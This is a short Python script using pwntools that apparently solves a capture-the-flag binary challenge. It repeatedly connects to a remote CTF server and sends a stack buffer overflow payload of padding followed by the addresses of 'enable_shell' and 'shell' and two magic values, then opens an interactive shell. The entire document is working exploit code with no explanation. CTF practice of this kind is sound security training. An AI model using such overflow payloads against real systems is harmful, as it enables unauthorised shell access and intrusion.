from pwn import *

elf=ELF("./0xb0f")
for i in range(64):
	print(i)
	#p = process("./0xb0f")
	p = remote("pwn.pwnme.fr",7007)
	p.sendline(b"a"*22+p32(elf.symbols["enable_shell"])+p32(elf.symbols["shell"])+p32(0xcafec0de)+p32(0xdeadbeef))
	p.interactive()
	
